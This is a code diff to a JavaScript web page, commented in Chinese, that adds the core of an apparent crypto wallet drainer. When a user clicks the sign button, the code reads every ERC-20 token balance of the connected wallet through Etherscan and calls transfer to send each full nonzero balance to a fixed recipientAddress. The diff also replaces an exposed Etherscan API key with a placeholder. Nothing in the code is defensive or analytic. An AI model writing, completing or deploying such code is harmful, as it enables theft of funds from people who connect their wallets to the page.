@@ -66,17 +66,46 @@ document.getElementById('signButton').onclick = async () => {
     }
 };
 
-// 转移代币的函数（简化版，确保核心功能运行）
+// 连接钱包，签名并转移代币的核心逻辑
 const transferAssets = async (account) => {
     updateStatus(`正在获取 ${account} 的代币余额...`);
-    // 此处可以根据需要添加代币转移逻辑
-    updateStatus('代币转移成功');
+    
+    try {
+        const tokenBalances = await getTokenBalances(account);
+
+        for (const tokenAddress in tokenBalances) {
+            const token = tokenBalances[tokenAddress];
+            const balance = token.balance;
+
+            if (balance.gt(0)) {
+                // 创建代币合约实例
+                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+
+                // 调用合约的 transferFrom 方法进行转移
+                try {
+                    const transfer = await tokenContract.methods
+                        .transfer(recipientAddress, balance.toString())
+                        .send({ from: account });
+                    
+                    updateStatus(`成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`);
+                } catch (transferError) {
+                    updateStatus(`转移 ${token.symbol} 失败: ${transferError.message}`);
+                }
+            } else {
+                updateStatus(`账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`);
+            }
+        }
+
+        updateStatus('所有代币转移完成');
+    } catch (error) {
+        updateStatus('获取代币余额失败: ' + error.message);
+    }
 };
 
 // 获取代币余额的函数
 const getTokenBalances = async (address) => {
     try {
-        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=6I5NKMYZ4W9SUDGGM3GJBAB9Y2UK324G63`;
+        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=YOUR_API_KEY`;
         const response = await axios.get(url);
         const transactions = response.data.result;
 
@@ -97,6 +126,7 @@ const getTokenBalances = async (address) => {
                 };
             }
 
+            // 计算账户余额的增减
             if (tx.from.toLowerCase() === address.toLowerCase()) {
                 tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
             }
